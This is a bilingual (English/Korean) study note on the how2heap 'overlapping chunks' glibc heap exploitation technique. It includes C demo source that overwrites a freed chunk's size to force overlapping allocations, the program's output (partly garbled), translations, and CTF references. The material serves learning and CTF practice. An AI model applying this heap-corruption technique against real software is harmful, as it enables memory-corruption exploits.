# How2Heap Study 08 Overlapping Chunks

## Tech Overview

Exploit the overwrite of a freed chunk size in the unsorted bin in order to make a new allocation overlap with an existing chunk

## Source

```c
/*

 A simple tale of overlapping chunk.
 This technique is taken from
 http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

int main(int argc , char* argv[]){


	intptr_t *p1,*p2,*p3,*p4;

	fprintf(stderr, "\nThis is a simple chunks overlapping problem\n\n");
	fprintf(stderr, "Let's start to allocate 3 chunks on the heap\n");

	p1 = malloc(0x100 - 8);
	p2 = malloc(0x100 - 8);
	p3 = malloc(0x80 - 8);

	fprintf(stderr, "The 3 chunks have been allocated here:\np1=%p\np2=%p\np3=%p\n", p1, p2, p3);

	memset(p1, '1', 0x100 - 8);
	memset(p2, '2', 0x100 - 8);
	memset(p3, '3', 0x80 - 8);

	fprintf(stderr, "\nNow let's free the chunk p2\n");
	free(p2);
	fprintf(stderr, "The chunk p2 is now in the unsorted bin ready to serve possible\nnew malloc() of its size\n");

	fprintf(stderr, "Now let's simulate an overflow that can overwrite the size of the\nchunk freed p2.\n");
	fprintf(stderr, "For a toy program, the value of the last 3 bits is unimportant;"
		" however, it is best to maintain the stability of the heap.\n");
	fprintf(stderr, "To achieve this stability we will mark the least signifigant bit as 1 (prev_inuse),"
		" to assure that p1 is not mistaken for a free chunk.\n");

	int evil_chunk_size = 0x181;
	int evil_region_size = 0x180 - 8;
	fprintf(stderr, "We are going to set the size of chunk p2 to to %d, which gives us\na region size of %d\n",
		 evil_chunk_size, evil_region_size);

	*(p2-1) = evil_chunk_size; // we are overwriting the "size" field of chunk p2

	fprintf(stderr, "\nNow let's allocate another chunk with a size equal to the data\n"
	       "size of the chunk p2 injected size\n");
	fprintf(stderr, "This malloc will be served from the previously freed chunk that\n"
	       "is parked in the unsorted bin which size has been modified by us\n");
	p4 = malloc(evil_region_size);

	fprintf(stderr, "\np4 has been allocated at %p and ends at %p\n", p4, p4+evil_region_size);
	fprintf(stderr, "p3 starts at %p and ends at %p\n", p3, p3+80);
	fprintf(stderr, "p4 should overlap with p3, in this case p4 includes all p3.\n");

	fprintf(stderr, "\nNow everything copied inside chunk p4 can overwrites data on\nchunk p3,"
		" and data written to chunk p3 can overwrite data\nstored in the p4 chunk.\n\n");

	fprintf(stderr, "Let's run through an example. Right now, we have:\n");
	fprintf(stderr, "p4 = %s\n", (char *)p4);
	fprintf(stderr, "p3 = %s\n", (char *)p3);

	fprintf(stderr, "\nIf we memset(p4, '4', %d), we have:\n", evil_region_size);
	memset(p4, '4', evil_region_size);
	fprintf(stderr, "p4 = %s\n", (char *)p4);
	fprintf(stderr, "p3 = %s\n", (char *)p3);

	fprintf(stderr, "\nAnd if we then memset(p3, '3', 80), we have:\n");
	memset(p3, '3', 80);
	fprintf(stderr, "p4 = %s\n", (char *)p4);
	fprintf(stderr, "p3 = %s\n", (char *)p3);
}
```

## Output

```
This is a simple chunks overlapping problem

Let's start to allocate 3 chunks on the heap
The 3 chunks have been allocated here:
p1=0x1944010
p2=0x1944110
p3=0x1944210

Now let's free the chunk p2
The chunk p2 is now in the unsorted bin ready to serve possible new malloc() of its size
Now let's simulate an overflow that can overwrite the size of the chunk freed p2.
For a toy program, the value of the last 3 bits is unimportant; however, it is best to maintain the stability of the heap.
To achieve this stability we will mark the least signifiㅊant bit as 1 (prev_inuse), to assure that p1 is not mistaken for a free chunk.
We are going to set the size of chunk p2 to to 385, which gives us a region size of 376

Now let's allocate another chunk with a size equal to the data size of the chunk p2 injected size
This malloc will be served from the previously freed chunk that is parked in the unsorted bin which size has been modified by us

p4 has been allocated at 0x1944110 and ends at 0x1944cd0
p3 starts at 0x1944210 and ends at 0x1944490
p4 should overlap with p3, in this case p4 includes all p3.

Now everything copied inside chunk p4 can overwrites data on chunk p3, and data written to chunk p3 can overwrite data stored in the p4 chunk.

Let's run through an example. Right now, we have:
p4 = xK
╗3 = 333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333

If we memset(p4, '4', 376), we have:
p4 = 44444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444╗4444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444
╗3 = 444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444

And if we then memset(p3, '3', 80), we have:
p4 = 44444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444╗4444444444444444444444444444444444444333333333333333333333333333333333333333333333333333333333333333333333333333333334444444444444444444444444444444444444444
╗3 = 333333333333333333333333333333333333333333333333333333333333333333333333333333334444444444444444444444444444444444444444
```

## 개요 번역

Exploit the overwrite of a freed chunk size in the unsorted bin in order to make a new allocation overlap with an existing chunk
새로 메모리를 할당하려 할 때 이미 존재하는 청크를 겹쳐 할당하도록 unsorted bin 안의 해제된 청크 크기를 덮어 써 공격합니다.

(번역은 완벽하지 않으며, 추후 수정될 수 있습니다.)

## 출력 번역

```
This is a simple chunks overlapping problem
이것은 간단한 중복 문제입니다.

Let's start to allocate 3 chunks on the heap
힙에 3개의 청크를 할당하는 것으로 시작합니다.

The 3 chunks have been allocated here:
3 개의 청크들은 이 곳에 할당되어 있습니다.

p1=0x1944010
p2=0x1944110
p3=0x1944210

Now let's free the chunk p2
이제 chunk p2 를 해제합니다.

The chunk p2 is now in the unsorted bin ready to serve possible new malloc() of its size
p2 청크는 이제 새롭게 이 크기의 malloc() 이 호출되었을 때 제공할 수 있게 하기 위해 unsorted bin 에 존재하게 됩니다.

Now let's simulate an overflow that can overwrite the size of the chunk freed p2.
이제 해제된 p2 청크의 크기를 덮어쓸 수 있도록 오버플로우를 시연해보겠습니다.

For a toy program, the value of the last 3 bits is unimportant; however, it is best to maintain the stability of the heap.
모형(?) 프로그램에서는, 마지막 3비트 값은 중요하지 않습니다; 그러나, 이것은 힙의 안정성을 유지하는데 최고입니다.

To achieve this stability we will mark the least significant bit as 1 (prev_inuse), to assure that p1 is not mistaken for a free chunk.
이 안정성을 유지하기 위해서는 매우 작은 1개의 중요한 비트를 1로 설정해야 합니다.
여기서는 p1이 해제된 청크에 대해 잘못 알고 있지 않다는 것을 보장하게 하기 위해서 입니다.

We are going to set the size of chunk p2 to 385, which gives us a region size of 376
이제 p2 청크의 크기를 385 로 설정하여 376 크기의 구역을 주도록 합니다.

Now let's allocate another chunk with a size equal to the data size of the chunk p2 injected size
이제 p2 청크에서 공격당한 크기에 대해 데이터의 크기와 같은 크기로 다른 청크를 할당합니다.

This malloc will be served from the previously freed chunk that is parked in the unsorted bin which size has been modified by us
이 malloc 는 우리에 의해 크기가 수정된 바로 이전에 해제되어 unsorted bin 에 해제되어 있던 청크를 줄 것입니다.

p4 has been allocated at 0x1944110 and ends at 0x1944cd0
p4 는 0x1944110 에 할당되었고, 끝은 0x1944cd0 입니다.

p3 starts at 0x1944210 and ends at 0x1944490
p3 는 0x1944210 에서 시작하고, 끝은 0x1944490 입니다. (??????????????????????? 구동 환경 ubuntu 16.04 인데 그래서 안됬나 봅니다....)

p4 should overlap with p3, in this case p4 includes all p3.
p4 는 p3 와 겹칠 것이며, 여기서는 p4가 p3 를 모두 포함하고 있습니다.

Now everything copied inside chunk p4 can overwrites data on chunk p3, and data written to chunk p3 can overwrite data stored in the p4 chunk.
이제 p4 청크에 내용을 복사하게 되면 모든 내용은 p3 에 덮어쓰여지게 되고, 또한 p3에 써 넣은 내용은 p4 청크에 덮어써져 저장되게 됩니다.

Let's run through an example. Right now, we have:
이제 예제를 실행해보겠습니다.

p4 = xK
╗3 = 333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333

If we memset(p4, '4', 376), we have:
만약 p4를 '4'로 376 개를 채운다면

p4 = 44444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444╗4444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444
╗3 = 444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444

And if we then memset(p3, '3', 80), we have:
만약 p3를 '3'로 80 개를 채운다면

p4 = 44444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444╗4444444444444444444444444444444444444333333333333333333333333333333333333333333333333333333333333333333333333333333334444444444444444444444444444444444444444
╗3 = 333333333333333333333333333333333333333333333333333333333333333333333333333333334444444444444444444444444444444444444444
```

## Applicable CTF Challenges
(적용 가능한 CTF 문제들)

* hack.lu CTF 2015-bookstore - [블로그]() / [바이너리](https://github.com/ctfs/write-ups-2015/tree/master/hack-lu-ctf-2015/exploiting/bookstore)
* Nuit du Hack 2016-night-deamonic-heap - [블로그]() / [바이너리](https://github.com/ctfs/write-ups-2016/tree/master/nuitduhack-quals-2016/exploit-me/night-deamonic-heap-400)